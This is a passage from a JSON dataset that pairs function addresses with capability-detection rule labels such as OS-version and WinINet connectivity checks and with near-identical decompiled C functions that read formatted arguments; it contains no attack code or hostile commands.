        "decompiled_code": "\nuint __cdecl fcn.0043ea20(uint *arg_8h)\n\n{\n    uint *puVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        puVar1 = *(in_ECX + 0x10);\n        *(in_ECX + 0x10) = puVar1 + 1;\n        *arg_8h = *puVar1;\n    }\n    else {\n        uVar2 = *(in_ECX + 0xaa8);\n        if (99 < uVar2) {\n            iVar3 = *(in_ECX + 8);\n            *(iVar3 + 0x1c) = 1;\n            *(iVar3 + 0x18) = 0x16;\n            fcn.0043bac1(0, 0, 0, 0, 0, *(in_ECX + 8));\n            return 0;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar4 = fcn.004541f5(in_ECX + 0x464 + uVar2 * 0x10, 3, *(in_ECX + 0x2e), *(in_ECX + 0x28));\n            return uVar4;\n        }\n        *arg_8h = **(in_ECX + 0x46c + uVar2 * 0x10);\n    }\n    return 1;\n}\n",
        "token_count": 346
    },
    "0043eb40": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0043eb40(uint *arg_8h)\n\n{\n    uint *puVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint32_t in_EAX;\n    uint uVar4;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        puVar1 = *(in_ECX + 0x10);\n        *(in_ECX + 0x10) = puVar1 + 1;\n        *arg_8h = *puVar1;\n    }\n    else {\n        uVar2 = *(in_ECX + 0xaa8);\n        if (99 < uVar2) {\n            iVar3 = *(in_ECX + 8);\n            *(iVar3 + 0x1c) = 1;\n            *(iVar3 + 0x18) = 0x16;\n            fcn.0043bac1(0, 0, 0, 0, 0, *(in_ECX + 8));\n            return 0;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar4 = fcn.004540cd(in_ECX + 0x464 + uVar2 * 0x10, 3, in_EAX & 0xffffff00 | *(in_ECX + 0x2d), \n                                 *(in_ECX + 0x28));\n            return uVar4;\n        }\n        *arg_8h = **(in_ECX + 0x46c + uVar2 * 0x10);\n    }\n    return 1;\n}\n",
        "token_count": 364
    },
    "0043ec25": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0043ec25(uint *arg_8h)\n\n{\n    uint *puVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint32_t in_EAX;\n    uint uVar4;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        puVar1 = *(in_ECX + 0x10);\n        *(in_ECX + 0x10) = puVar1 + 1;\n        *arg_8h = *puVar1;\n    }\n    else {\n        uVar2 = *(in_ECX + 0xaa8);\n        if (99 < uVar2) {\n            iVar3 = *(in_ECX + 8);\n            *(iVar3 + 0x1c) = 1;\n            *(iVar3 + 0x18) = 0x16;\n            fcn.0043bac1(0, 0, 0, 0, 0, *(in_ECX + 8));\n            return 0;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar4 = fcn.0045412f(in_ECX + 0x464 + uVar2 * 0x10, 3, in_EAX & 0xffffff00 | *(in_ECX + 0x2d), \n                                 *(in_ECX + 0x28));\n            return uVar4;\n        }\n        *arg_8h = **(in_ECX + 0x46c + uVar2 * 0x10);\n    }\n    return 1;\n}\n",
        "token_count": 365
    },
    "0043ed0a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0043ed0a(uint *arg_8h)\n\n{\n    uint *puVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        puVar1 = *(in_ECX + 0x10);\n        *(in_ECX + 0x10) = puVar1 + 1;\n        *arg_8h = *puVar1;\n    }\n    else {\n        uVar2 = *(in_ECX + 0xaa8);\n        if (99 < uVar2) {\n            iVar3 = *(in_ECX + 8);\n            *(iVar3 + 0x1c) = 1;\n            *(iVar3 + 0x18) = 0x16;\n            fcn.0043bac1(0, 0, 0, 0, 0, *(in_ECX + 8));\n            return 0;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar4 = fcn.00454191(in_ECX + 0x464 + uVar2 * 0x10, 3, *(in_ECX + 0x2e), *(in_ECX + 0x28));\n            return uVar4;\n        }\n        *arg_8h = **(in_ECX + 0x46c + uVar2 * 0x10);\n    }\n    return 1;\n}\n",
        "token_count": 346
    },
    "0043edf0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0043edf0(uint *arg_8h)\n\n{\n    uint *puVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        puVar1 = *(in_ECX + 0x10);\n        *(in_ECX + 0x10) = puVar1 + 1;\n        *arg_8h = *puVar1;\n    }\n    else {\n        uVar2 = *(in_ECX + 0xaa8);\n        if (99 < uVar2) {\n            iVar3 = *(in_ECX + 8);\n            *(iVar3 + 0x1c) = 1;\n            *(iVar3 + 0x18) = 0x16;\n            fcn.0043bac1(0, 0, 0, 0, 0, *(in_ECX + 8));\n            return 0;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar4 = fcn.004541f5(in_ECX + 0x464 + uVar2 * 0x10, 3, *(in_ECX + 0x2e), *(in_ECX + 0x28));\n            return uVar4;\n        }\n        *arg_8h = **(in_ECX + 0x46c + uVar2 * 0x10);\n    }\n    return 1;\n}\n",
        "token_count": 347
    },
    "0043eeb9": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0043eeb9(uint *arg_8h)\n\n{\n    uint *puVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint32_t in_EAX;\n    uint uVar4;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        puVar1 = *(in_ECX + 0x10);\n        *(in_ECX + 0x10) = puVar1 + 1;\n        *arg_8h = *puVar1;\n    }\n    else {\n        uVar2 = *(in_ECX + 0xaa8);\n        if (99 < uVar2) {\n            iVar3 = *(in_ECX + 8);\n            *(iVar3 + 0x1c) = 1;\n            *(iVar3 + 0x18) = 0x16;\n            fcn.0043bac1(0, 0, 0, 0, 0, *(in_ECX + 8));\n            return 0;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar4 = fcn.004540cd(in_ECX + 0x464 + uVar2 * 0x10, 3, in_EAX & 0xffffff00 | *(in_ECX + 0x2d), \n                                 *(in_ECX + 0x28));\n            return uVar4;\n        }\n        *arg_8h = **(in_ECX + 0x46c + uVar2 * 0x10);\n    }\n    return 1;\n}\n",
        "token_count": 365
    },
    "0043ef47": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0043ef47(uint *arg_8h)\n\n{\n    uint *puVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint32_t in_EAX;\n    uint uVar4;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        puVar1 = *(in_ECX + 0x10);\n        *(in_ECX + 0x10) = puVar1 + 1;\n        *arg_8h = *puVar1;\n    }\n    else {\n        uVar2 = *(in_ECX + 0xaa8);\n        if (99 < uVar2) {\n            iVar3 = *(in_ECX + 8);\n            *(iVar3 + 0x1c) = 1;\n            *(iVar3 + 0x18) = 0x16;\n            fcn.0043bac1(0, 0, 0, 0, 0, *(in_ECX + 8));\n            return 0;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar4 = fcn.0045412f(in_ECX + 0x464 + uVar2 * 0x10, 3, in_EAX & 0xffffff00 | *(in_ECX + 0x2d), \n                                 *(in_ECX + 0x28));\n            return uVar4;\n        }\n        *arg_8h = **(in_ECX + 0x46c + uVar2 * 0x10);\n    }\n    return 1;\n}\n",
        "token_count": 365
    },
    "0043efd5": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0043efd5(uint *arg_8h)\n\n{\n    uint *puVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        puVar1 = *(in_ECX + 0x10);\n        *(in_ECX + 0x10) = puVar1 + 1;\n        *arg_8h = *puVar1;\n    }\n    else {\n        uVar2 = *(in_ECX + 0xaa8);\n        if (99 < uVar2) {\n            iVar3 = *(in_ECX + 8);\n            *(iVar3 + 0x1c) = 1;\n            *(iVar3 + 0x18) = 0x16;\n            fcn.0043bac1(0, 0, 0, 0, 0, *(in_ECX + 8));\n            return 0;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar4 = fcn.00454191(in_ECX + 0x464 + uVar2 * 0x10, 3, *(in_ECX + 0x2e), *(in_ECX + 0x28));\n            return uVar4;\n        }\n        *arg_8h = **(in_ECX + 0x46c + uVar2 * 0x10);\n    }\n    return 1;\n}\n",
        "token_count": 345
    },
    "0043f064": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0043f064(uint *arg_8h)\n\n{\n    uint *puVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        puVar1 = *(in_ECX + 0x10);\n        *(in_ECX + 0x10) = puVar1 + 1;\n        *arg_8h = *puVar1;\n    }\n    else {\n        uVar2 = *(in_ECX + 0xaa8);\n        if (99 < uVar2) {\n            iVar3 = *(in_ECX + 8);\n            *(iVar3 + 0x1c) = 1;\n            *(iVar3 + 0x18) = 0x16;\n            fcn.0043bac1(0, 0, 0, 0, 0, *(in_ECX + 8));\n            return 0;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar4 = fcn.004541f5(in_ECX + 0x464 + uVar2 * 0x10, 3, *(in_ECX + 0x2e), *(in_ECX + 0x28));\n            return uVar4;\n        }\n        *arg_8h = **(in_ECX + 0x46c + uVar2 * 0x10);\n    }\n    return 1;\n}\n",
        "token_count": 346
    },
    "0043f167": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0043f167(uint *arg_8h)\n\n{\n    uint *puVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint32_t in_EAX;\n    uint uVar4;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        puVar1 = *(in_ECX + 0x10);\n        *(in_ECX + 0x10) = puVar1 + 2;\n        uVar4 = puVar1[1];\n        *arg_8h = *puVar1;\n        arg_8h[1] = uVar4;\n    }\n    else {\n        uVar2 = *(in_ECX + 0xaa8);\n        if (99 < uVar2) {\n            iVar3 = *(in_ECX + 8);\n            *(iVar3 + 0x1c) = 1;\n            *(iVar3 + 0x18) = 0x16;\n            fcn.0043bac1(0, 0, 0, 0, 0, *(in_ECX + 8));\n            return 0;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar4 = fcn.004540cd(in_ECX + 0x464 + uVar2 * 0x10, 4, in_EAX & 0xffffff00 | *(in_ECX + 0x2d), \n                                 *(in_ECX + 0x28));\n            return uVar4;\n        }\n        puVar1 = *(in_ECX + 0x46c + uVar2 * 0x10);\n        uVar4 = puVar1[1];\n        *arg_8h = *puVar1;\n        arg_8h[1] = uVar4;\n    }\n    return 1;\n}\n",
        "token_count": 421
    },
    "0043f1fd": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0043f1fd(uint *arg_8h)\n\n{\n    uint *puVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint32_t in_EAX;\n    uint uVar4;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        puVar1 = *(in_ECX + 0x10);\n        *(in_ECX + 0x10) = puVar1 + 2;\n        uVar4 = puVar1[1];\n        *arg_8h = *puVar1;\n        arg_8h[1] = uVar4;\n    }\n    else {\n        uVar2 = *(in_ECX + 0xaa8);\n        if (99 < uVar2) {\n            iVar3 = *(in_ECX + 8);\n            *(iVar3 + 0x1c) = 1;\n            *(iVar3 + 0x18) = 0x16;\n            fcn.0043bac1(0, 0, 0, 0, 0, *(in_ECX + 8));\n            return 0;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar4 = fcn.0045412f(in_ECX + 0x464 + uVar2 * 0x10, 4, in_EAX & 0xffffff00 | *(in_ECX + 0x2d), \n                                 *(in_ECX + 0x28));\n            return uVar4;\n        }\n        puVar1 = *(in_ECX + 0x46c + uVar2 * 0x10);\n        uVar4 = puVar1[1];\n        *arg_8h = *puVar1;\n        arg_8h[1] = uVar4;\n    }\n    return 1;\n}\n",
        "token_count": 423
    },
    "0043f293": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0043f293(uint *arg_8h)\n\n{\n    uint *puVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        puVar1 = *(in_ECX + 0x10);\n        *(in_ECX + 0x10) = puVar1 + 2;\n        uVar4 = puVar1[1];\n        *arg_8h = *puVar1;\n        arg_8h[1] = uVar4;\n    }\n    else {\n        uVar2 = *(in_ECX + 0xaa8);\n        if (99 < uVar2) {\n            iVar3 = *(in_ECX + 8);\n            *(iVar3 + 0x1c) = 1;\n            *(iVar3 + 0x18) = 0x16;\n            fcn.0043bac1(0, 0, 0, 0, 0, *(in_ECX + 8));\n            return 0;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar4 = fcn.00454191(in_ECX + 0x464 + uVar2 * 0x10, 4, *(in_ECX + 0x2e), *(in_ECX + 0x28));\n            return uVar4;\n        }\n        puVar1 = *(in_ECX + 0x46c + uVar2 * 0x10);\n        uVar4 = puVar1[1];\n        *arg_8h = *puVar1;\n        arg_8h[1] = uVar4;\n    }\n    return 1;\n}\n",
        "token_count": 402
    },
    "0043f32a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0043f32a(uint *arg_8h)\n\n{\n    uint *puVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        puVar1 = *(in_ECX + 0x10);\n        *(in_ECX + 0x10) = puVar1 + 2;\n        uVar4 = puVar1[1];\n        *arg_8h = *puVar1;\n        arg_8h[1] = uVar4;\n    }\n    else {\n        uVar2 = *(in_ECX + 0xaa8);\n        if (99 < uVar2) {\n            iVar3 = *(in_ECX + 8);\n            *(iVar3 + 0x1c) = 1;\n            *(iVar3 + 0x18) = 0x16;\n            fcn.0043bac1(0, 0, 0, 0, 0, *(in_ECX + 8));\n            return 0;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar4 = fcn.004541f5(in_ECX + 0x464 + uVar2 * 0x10, 4, *(in_ECX + 0x2e), *(in_ECX + 0x28));\n            return uVar4;\n        }\n        puVar1 = *(in_ECX + 0x46c + uVar2 * 0x10);\n        uVar4 = puVar1[1];\n        *arg_8h = *puVar1;\n        arg_8h[1] = uVar4;\n    }\n    return 1;\n}\n",
        "token_count": 404
    },
    "0043f445": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0043f445(uint *arg_8h)\n\n{\n    uint *puVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint32_t in_EAX;\n    uint uVar4;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        puVar1 = *(in_ECX + 0x10);\n        *(in_ECX + 0x10) = puVar1 + 2;\n        uVar4 = *puVar1;\n        arg_8h[1] = puVar1[1];\n        *arg_8h = uVar4;\n    }\n    else {\n        uVar2 = *(in_ECX + 0xaa8);\n        if (99 < uVar2) {\n            iVar3 = *(in_ECX + 8);\n            *(iVar3 + 0x1c) = 1;\n            *(iVar3 + 0x18) = 0x16;\n            fcn.0043bac1(0, 0, 0, 0, 0, *(in_ECX + 8));\n            return 0;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar4 = fcn.004540cd(in_ECX + 0x464 + uVar2 * 0x10, 2, in_EAX & 0xffffff00 | *(in_ECX + 0x2d), \n                                 *(in_ECX + 0x28));\n            return uVar4;\n        }\n        puVar1 = *(in_ECX + 0x46c + uVar2 * 0x10);\n        uVar4 = puVar1[1];\n        *arg_8h = *puVar1;\n        arg_8h[1] = uVar4;\n    }\n    return 1;\n}\n",
        "token_count": 421
    },
    "0043f4df": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0043f4df(uint *arg_8h)\n\n{\n    uint *puVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint32_t in_EAX;\n    uint uVar4;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        puVar1 = *(in_ECX + 0x10);\n        *(in_ECX + 0x10) = puVar1 + 2;\n        uVar4 = *puVar1;\n        arg_8h[1] = puVar1[1];\n        *arg_8h = uVar4;\n    }\n    else {\n        uVar2 = *(in_ECX + 0xaa8);\n        if (99 < uVar2) {\n            iVar3 = *(in_ECX + 8);\n            *(iVar3 + 0x1c) = 1;\n            *(iVar3 + 0x18) = 0x16;\n            fcn.0043bac1(0, 0, 0, 0, 0, *(in_ECX + 8));\n            return 0;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar4 = fcn.0045412f(in_ECX + 0x464 + uVar2 * 0x10, 2, in_EAX & 0xffffff00 | *(in_ECX + 0x2d), \n                                 *(in_ECX + 0x28));\n            return uVar4;\n        }\n        puVar1 = *(in_ECX + 0x46c + uVar2 * 0x10);\n        uVar4 = puVar1[1];\n        *arg_8h = *puVar1;\n        arg_8h[1] = uVar4;\n    }\n    return 1;\n}\n",
        "token_count": 423
    },
    "0043f579": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0043f579(uint *arg_8h)\n\n{\n    uint *puVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        puVar1 = *(in_ECX + 0x10);\n        *(in_ECX + 0x10) = puVar1 + 2;\n        uVar4 = *puVar1;\n        arg_8h[1] = puVar1[1];\n        *arg_8h = uVar4;\n    }\n    else {\n        uVar2 = *(in_ECX + 0xaa8);\n        if (99 < uVar2) {\n            iVar3 = *(in_ECX + 8);\n            *(iVar3 + 0x1c) = 1;\n            *(iVar3 + 0x18) = 0x16;\n            fcn.0043bac1(0, 0, 0, 0, 0, *(in_ECX + 8));\n            return 0;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar4 = fcn.00454191(in_ECX + 0x464 + uVar2 * 0x10, 2, *(in_ECX + 0x2e), *(in_ECX + 0x28));\n            return uVar4;\n        }\n        puVar1 = *(in_ECX + 0x46c + uVar2 * 0x10);\n        uVar4 = puVar1[1];\n        *arg_8h = *puVar1;\n        arg_8h[1] = uVar4;\n    }\n    return 1;\n}\n",
        "token_count": 402
    },
    "0043f614": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0043f614(uint *arg_8h)\n\n{\n    uint *puVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        puVar1 = *(in_ECX + 0x10);\n        *(in_ECX + 0x10) = puVar1 + 2;\n        uVar4 = *puVar1;\n        arg_8h[1] = puVar1[1];\n        *arg_8h = uVar4;\n    }\n    else {\n        uVar2 = *(in_ECX + 0xaa8);\n        if (99 < uVar2) {\n            iVar3 = *(in_ECX + 8);\n            *(iVar3 + 0x1c) = 1;\n            *(iVar3 + 0x18) = 0x16;\n            fcn.0043bac1(0, 0, 0, 0, 0, *(in_ECX + 8));\n            return 0;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar4 = fcn.004541f5(in_ECX + 0x464 + uVar2 * 0x10, 2, *(in_ECX + 0x2e), *(in_ECX + 0x28));\n            return uVar4;\n        }\n        puVar1 = *(in_ECX + 0x46c + uVar2 * 0x10);\n        uVar4 = puVar1[1];\n        *arg_8h = *puVar1;\n        arg_8h[1] = uVar4;\n    }\n    return 1;\n}\n",
        "token_count": 403
    },
    "0043f733": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0043f733(uint *arg_8h)\n\n{\n    uint *puVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint32_t in_EAX;\n    uint uVar4;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        puVar1 = *(in_ECX + 0x10);\n        *(in_ECX + 0x10) = puVar1 + 2;\n        uVar4 = *puVar1;\n        arg_8h[1] = puVar1[1];\n        *arg_8h = uVar4;\n    }\n    else {\n        uVar2 = *(in_ECX + 0xaa8);\n        if (99 < uVar2) {\n            iVar3 = *(in_ECX + 8);\n            *(iVar3 + 0x1c) = 1;\n            *(iVar3 + 0x18) = 0x16;\n            fcn.0043bac1(0, 0, 0, 0, 0, *(in_ECX + 8));\n            return 0;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar4 = fcn.004540cd(in_ECX + 0x464 + uVar2 * 0x10, 2, in_EAX & 0xffffff00 | *(in_ECX + 0x2d), \n                                 *(in_ECX + 0x28));\n            return uVar4;\n        }\n        puVar1 = *(in_ECX + 0x46c + uVar2 * 0x10);\n        uVar4 = puVar1[1];\n        *arg_8h = *puVar1;\n        arg_8h[1] = uVar4;\n    }\n    return 1;\n}\n",
        "token_count": 421
    },
    "0043f7cd": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0043f7cd(uint *arg_8h)\n\n{\n    uint *puVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint32_t in_EAX;\n    uint uVar4;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        puVar1 = *(in_ECX + 0x10);\n        *(in_ECX + 0x10) = puVar1 + 2;\n        uVar4 = *puVar1;\n        arg_8h[1] = puVar1[1];\n        *arg_8h = uVar4;\n    }\n    else {\n        uVar2 = *(in_ECX + 0xaa8);\n        if (99 < uVar2) {\n            iVar3 = *(in_ECX + 8);\n            *(iVar3 + 0x1c) = 1;\n            *(iVar3 + 0x18) = 0x16;\n            fcn.0043bac1(0, 0, 0, 0, 0, *(in_ECX + 8));\n            return 0;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar4 = fcn.0045412f(in_ECX + 0x464 + uVar2 * 0x10, 2, in_EAX & 0xffffff00 | *(in_ECX + 0x2d), \n                                 *(in_ECX + 0x28));\n            return uVar4;\n        }\n        puVar1 = *(in_ECX + 0x46c + uVar2 * 0x10);\n        uVar4 = puVar1[1];\n        *arg_8h = *puVar1;\n        arg_8h[1] = uVar4;\n    }\n    return 1;\n}\n",
        "token_count": 423
    },
    "0043f867": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0043f867(uint *arg_8h)\n\n{\n    uint *puVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        puVar1 = *(in_ECX + 0x10);\n        *(in_ECX + 0x10) = puVar1 + 2;\n        uVar4 = *puVar1;\n        arg_8h[1] = puVar1[1];\n        *arg_8h = uVar4;\n    }\n    else {\n        uVar2 = *(in_ECX + 0xaa8);\n        if (99 < uVar2) {\n            iVar3 = *(in_ECX + 8);\n            *(iVar3 + 0x1c) = 1;\n            *(iVar3 + 0x18) = 0x16;\n            fcn.0043bac1(0, 0, 0, 0, 0, *(in_ECX + 8));\n            return 0;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar4 = fcn.00454191(in_ECX + 0x464 + uVar2 * 0x10, 2, *(in_ECX + 0x2e), *(in_ECX + 0x28));\n            return uVar4;\n        }\n        puVar1 = *(in_ECX + 0x46c + uVar2 * 0x10);\n        uVar4 = puVar1[1];\n        *arg_8h = *puVar1;\n        arg_8h[1] = uVar4;\n    }\n    return 1;\n}\n",
        "token_count": 402
    },
    "0043f902": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0043f902(uint *arg_8h)\n\n{\n    uint *puVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        puVar1 = *(in_ECX + 0x10);\n        *(in_ECX + 0x10) = puVar1 + 2;\n        uVar4 = *puVar1;\n        arg_8h[1] = puVar1[1];\n        *arg_8h = uVar4;\n    }\n    else {\n        uVar2 = *(in_ECX + 0xaa8);\n        if (99 < uVar2) {\n            iVar3 = *(in_ECX + 8);\n            *(iVar3 + 0x1c) = 1;\n            *(iVar3 + 0x18) = 0x16;\n            fcn.0043bac1(0, 0, 0, 0, 0, *(in_ECX + 8));\n            return 0;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar4 = fcn.004541f5(in_ECX + 0x464 + uVar2 * 0x10, 2, *(in_ECX + 0x2e), *(in_ECX + 0x28));\n            return uVar4;\n        }\n        puVar1 = *(in_ECX + 0x46c + uVar2 * 0x10);\n        uVar4 = puVar1[1];\n        *arg_8h = *puVar1;\n        arg_8h[1] = uVar4;\n    }\n    return 1;\n}\n",
        "token_count": 403
    },
    "0043fa21": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
